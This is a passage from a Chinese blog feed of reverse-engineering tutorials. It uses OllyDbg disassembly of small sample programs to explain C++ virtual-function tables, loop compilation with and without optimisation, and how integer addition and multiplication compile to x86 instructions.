<p>虚函数是在程序运行时定义的函数，它的地址不能在编译的时候决定，只有在调用的时候才能确定虚函数的地址，所有对虚函数的引用通常都放在一个专属的数组中，也就是虚函数表 Virtual Table 中，缩写为：VTBL，也就是：Virtual Table List。数组的每一个元素都存放在这个类中虚函数的地址，在调用虚函数时，先取出虚函数表指针，也就是指向 VTBL 的指针，得到虚函数表的地址就是首地址，再根据这个地址到虚函数表中取出函数的地址，取出地址之后再用汇编语言中的 call 来进行调用。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331151220890.png" alt="image-20220331151220890" /></p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>class CSum<span class="token comment">// 创建类</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>public<span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	virtual <span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token comment">// 虚函数</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>	virtual	<span class="token keyword">int</span>	<span class="token function">Sub</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b <span class="token punctuation">)</span> <span class="token comment">// 虚函数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#123;</span>   </pre></td></tr><tr><td data-num="19"></td><td><pre>	CSum<span class="token operator">*</span>	pCSum <span class="token operator">=</span> new CSum <span class="token punctuation">;</span>  <span class="token comment">// 声名类对象</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>	pCSum<span class="token operator">-></span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 通过指针调用</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	pCSum<span class="token operator">-></span><span class="token function">Sub</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开执行程序</p>
<p>找到函数入口</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331151430257.png" alt="image-20220331151430257" /></p>
<p>进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331151439691.png" alt="image-20220331151439691" /></p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">04</span>         PUSH <span class="token number">4</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">58000000</span>   CALL Calling_<span class="token punctuation">.</span><span class="token number">00401060</span>                      <span class="token punctuation">;</span>  new出一个四字节的空间 类对象 实例对象</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401008</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">85</span>C0          TEST EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">74</span> <span class="token number">0</span>A         JE SHORT Calling_<span class="token punctuation">.</span><span class="token number">00401019</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C700 A0504000 MOV DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token punctuation">]</span><span class="token punctuation">,</span>Calling_<span class="token punctuation">.</span><span class="token number">004050</span>A0    <span class="token punctuation">;</span>  虚函数表的基址 <span class="token number">004050</span>A0虚函数表的指针</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401015</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BF0          MOV ESI<span class="token punctuation">,</span>EAX                                 <span class="token punctuation">;</span>  esi <span class="token operator">=</span> VTBL esi <span class="token operator">=</span> 虚函数表</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  EB <span class="token number">02</span>         JMP SHORT Calling_<span class="token punctuation">.</span><span class="token number">0040101</span>B</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401019</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">33F</span><span class="token number">6</span>          XOR ESI<span class="token punctuation">,</span>ESI                                 <span class="token punctuation">;</span>  null</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">8</span>B06          MOV EAX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token punctuation">]</span>                  <span class="token punctuation">;</span>  取地址，把虚函数表中的第一个地址给eax</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">02</span>         PUSH <span class="token number">2</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">01</span>         PUSH <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BCE          MOV ECX<span class="token punctuation">,</span>ESI                                 <span class="token punctuation">;</span>  this指针</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  FF10          CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token punctuation">]</span>                     <span class="token punctuation">;</span>  call虚函数表中的第一个地址</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B16          MOV EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token punctuation">]</span>                  <span class="token punctuation">;</span>  取出基地址</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">02</span>         PUSH <span class="token number">2</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">00401029</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">01</span>         PUSH <span class="token number">1</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BCE          MOV ECX<span class="token punctuation">,</span>ESI                                 <span class="token punctuation">;</span>  this指针</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  FF52 <span class="token number">04</span>       CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EDX<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>                   <span class="token punctuation">;</span>  调用edx <span class="token operator">+</span> <span class="token number">4</span>，edx <span class="token operator">=</span> 第一个函数地址，相当于call了虚函数表中的第二个函数</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">00401030</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">00401031</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331152443176.png" alt="image-20220331152443176" /></p>
<p>可以理解为：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>Fun<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>fun1address<span class="token punctuation">,</span>fun2address<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>fun1address <span class="token operator">=</span> 函数地址</pre></td></tr><tr><td data-num="3"></td><td><pre>fun1address <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">=</span> 第二个函数地址</pre></td></tr><tr><td data-num="4"></td><td><pre>Call<span class="token punctuation">[</span>Fun<span class="token punctuation">]</span> <span class="token operator">=</span> call fun1</pre></td></tr><tr><td data-num="5"></td><td><pre>Call<span class="token punctuation">[</span>Fun <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> call fun2</pre></td></tr></table></figure><h2 id="循环语句"><a class="anchor" href="#循环语句">#</a> 循环语句</h2>
<h3 id="没优化"><a class="anchor" href="#没优化">#</a> 没优化</h3>
<p>OD 分析：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331192155437.png" alt="image-20220331192155437" /></p>
<p>程序结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    temp <span class="token operator">=</span> temp <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="优化"><a class="anchor" href="#优化">#</a> 优化</h3>
<p>OD 分析：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220331192756637.png" alt="image-20220331192756637" /></p>
<p>主函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">33</span>C9          XOR ECX<span class="token punctuation">,</span>ECX                              <span class="token punctuation">;</span>  ecx清零</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401002</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX                              <span class="token punctuation">;</span>  eax清零</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401004</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">03</span>C8          <span class="token operator">/</span>ADD ECX<span class="token punctuation">,</span>EAX                             <span class="token punctuation">;</span>  eax <span class="token operator">=</span> temp</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">40</span>            <span class="token operator">|</span>INC EAX                                 <span class="token punctuation">;</span>  自增 temp <span class="token operator">++</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401007</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83F</span><span class="token number">8</span> <span class="token number">64</span>       <span class="token operator">|</span>CMP EAX<span class="token punctuation">,</span><span class="token number">64</span>                              <span class="token punctuation">;</span>  eax <span class="token operator">&lt;=</span> <span class="token number">0x64</span> temp <span class="token operator">&lt;=</span> <span class="token number">100</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>A  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> <span class="token number">7</span>E F8         \JLE SHORT 优化<span class="token number">.00401004</span>                   <span class="token punctuation">;</span>  小于等于就跳转</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040100</span>E  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>程序结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>temp <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span>temp <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    retnum <span class="token operator">=</span> retn<span class="token comment">//ADD ECX,EAX</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	 <span class="token keyword">int</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>		 sum <span class="token operator">=</span>sum <span class="token operator">+</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/24FAA6BE63EAC0525101441FD4DA2277.jpg" alt="img-24FAA6BE63EAC0525101441FD4DA2277" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位数学运算符解析</title>
    <url>/article/676c768a.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/yb.gif" alt="yb" /></p>
<h2 id="整数的加减法"><a class="anchor" href="#整数的加减法">#</a> 整数的加减法</h2>
<p>OD 进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401181240006.png" alt="image-20220401181240006" /></p>
<p>加法函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>LEA EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ECX<span class="token operator">+</span>EAX<span class="token operator">+</span><span class="token number">78</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>value <span class="token operator">=</span> ecx <span class="token operator">+</span> eax <span class="token operator">+</span> <span class="token number">78</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mov edx<span class="token punctuation">,</span>value</pre></td></tr></table></figure><p>主函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  sub esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4424 <span class="token number">00</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4C24 <span class="token number">00</span>     MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span>               <span class="token punctuation">;</span>  <span class="token keyword">int</span> b</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D5401 <span class="token number">78</span>     LEA EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ECX<span class="token operator">+</span>EAX<span class="token operator">+</span><span class="token number">78</span><span class="token punctuation">]</span>        <span class="token punctuation">;</span>  <span class="token punctuation">[</span>ecx <span class="token operator">+</span> eax <span class="token operator">+</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">;</span>edx <span class="token operator">=</span> ecx <span class="token operator">+</span> eax <span class="token operator">+</span> <span class="token number">78</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">52</span>            PUSH EDX                                 <span class="token punctuation">;</span>  edx <span class="token operator">=</span> value</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30704000</span>   PUSH add<span class="token punctuation">.</span><span class="token number">00407030</span>                        <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401013</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">08000000</span>   CALL add<span class="token punctuation">.</span><span class="token number">00401020</span>                        <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">0</span>C       ADD ESP<span class="token punctuation">,</span><span class="token number">0</span>C                               <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>D  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>函数还原：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> value <span class="token operator">=</span> a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token number">78</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 <span class="token comment">//scanf("%d",&amp;a);</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	 <span class="token comment">//scanf("%d",&amp;b);</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>a<span class="token operator">+</span>b<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	 </pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="整数的乘法"><a class="anchor" href="#整数的乘法">#</a> 整数的乘法</h2>
<p>OD 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220401184630837.png" alt="image-20220401184630837" /></p>
<p>依据数学的规律先算乘法再算加法</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  sub esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4424 <span class="token number">00</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D0C00        LEA ECX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span>EAX<span class="token punctuation">]</span>           <span class="token punctuation">;</span>  mov ecx<span class="token punctuation">,</span>eax <span class="token operator">+</span> eax</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401008</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D14C0        LEA EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span>EAX<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span>         <span class="token punctuation">;</span>  mov edx<span class="token punctuation">,</span>eax <span class="token operator">+</span> eax <span class="token operator">*</span> <span class="token number">8</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D0C80        LEA ECX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span>EAX<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span>         <span class="token punctuation">;</span>  mov ecx<span class="token punctuation">,</span>eax <span class="token operator">+</span> eax <span class="token operator">*</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">52</span>            PUSH EDX</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D5448 <span class="token number">04</span>     LEA EDX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span>ECX<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span>       <span class="token punctuation">;</span>  mov edx<span class="token punctuation">,</span>eax <span class="token operator">+</span> ecx <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">52</span>            PUSH EDX</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401015</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">30704000</span>   PUSH imul<span class="token punctuation">.</span><span class="token number">00407030</span>                       <span class="token punctuation">;</span>  ASCII <span class="token string">"%d %d %d"</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">11000000</span>   CALL imul<span class="token punctuation">.</span><span class="token number">00401030</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">14</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">14</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401024</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d %d"</span><span class="token punctuation">,</span> a<span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">,</span>a<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	 </pre></td></tr><tr><td 